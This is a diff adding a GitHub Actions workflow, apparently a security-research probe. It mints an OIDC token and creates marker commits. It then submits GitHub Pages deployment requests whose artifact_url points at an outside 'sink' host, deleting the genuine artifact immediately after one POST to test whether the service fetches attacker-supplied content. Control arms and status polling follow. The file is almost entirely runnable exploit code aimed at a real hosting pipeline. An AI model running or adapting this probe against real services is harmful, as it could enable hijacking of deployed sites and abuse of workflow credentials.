@@ -1,0 +1,66 @@
+name: reacharm2
+on:
+  workflow_dispatch:
+    inputs:
+      sink: { required: true }
+permissions: { contents: write, pages: write, id-token: write, actions: write }
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      - run: mkdir -p s && echo ok > s/index.html && tar -czf art.tar.gz -C s .
+      - uses: actions/upload-artifact@v4
+        with: { name: art-p, path: art.tar.gz }
+      - uses: actions/upload-artifact@v4
+        with: { name: art-n, path: art.tar.gz }
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SINK: ${{ inputs.sink }}
+        run: |
+          set -u
+          R=$GITHUB_REPOSITORY
+          A=https://api.github.com
+          API="$A/repos/$R/pages/deployments"
+          H=(-H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json")
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "OIDC_LEN=${#T}"
+          echo "PRECONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-PRE")"
+
+          curl -s "${H[@]}" "$A/repos/$R/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
+          IDP=$(jq -r '.artifacts[]|select(.name=="art-p").id' arts.json)
+          IDN=$(jq -r '.artifacts[]|select(.name=="art-n").id' arts.json)
+          echo "IDP=$IDP IDN=$IDN"
+
+          mkcommit(){ # $1 = marker -> echoes a fresh commit sha (pages_build_version must be a real commit)
+            curl -s "${H[@]}" -X PUT "$A/repos/$R/contents/marks/$1.txt" \
+              -d "$(jq -nc --arg m "mark $1" --arg c "$(echo -n "$1-$GITHUB_RUN_ID" | base64 -w0)" \
+                    '{message:$m,content:$c}')" | jq -r '.commit.sha'; }
+
+          SV=$(mkcommit v); SP=$(mkcommit p); SN=$(mkcommit n)
+          echo "SHAS v=$SV p=$SP n=$SN"
+
+          echo "===== ARM V (VALIDATOR CONTROL): artifact_url only -> must be 400 ====="
+          jq -nc --arg u "$SINK/ARM-V" --arg s "$SV" --arg t "$T" \
+            '{artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > v.json
+          echo "ARMV_HTTP=$(curl -s -o v.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @v.json)"
+          echo "ARMV_BODY=$(tr -d '\n' < v.out)"
+
+          echo "===== ARM N (NEGATIVE CONTROL): artifact_id INTACT -> url must never be read ====="
+          jq -nc --argjson id "$IDN" --arg u "$SINK/ARM-N" --arg s "$SN" --arg t "$T" \
+            '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > n.json
+          echo "ARMN_HTTP=$(curl -s -o n.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @n.json)"
+          echo "ARMN_BODY=$(tr -d '\n' < n.out)"
+
+          echo "===== ARM P (THE QUESTION): artifact_id DELETED right after the POST ====="
+          jq -nc --argjson id "$IDP" --arg u "$SINK/ARM-P" --arg s "$SP" --arg t "$T" \
+            '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > p.json
+          echo "ARMP_HTTP=$(curl -s -o p.out -w '%{http_code}' "${H[@]}" -X POST "$API" -d @p.json)"
+          echo "ARMP_DELETE=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE "${H[@]}" "$A/repos/$R/actions/artifacts/$IDP")"
+          echo "ARMP_BODY=$(tr -d '\n' < p.out)"
+
+          for i in 1 2 3 4 5 6 7 8; do sleep 15
+            echo "T$((i*15)) N=$(curl -s "${H[@]}" "$(jq -r '.status_url//empty' n.out)"|tr -d '\n ') P=$(curl -s "${H[@]}" "$(jq -r '.status_url//empty' p.out)"|tr -d '\n ')"
+          done
+          echo "POSTCONTROL=$(curl -s -o /dev/null -w '%{http_code}' "$SINK/CONTROL-POST")"
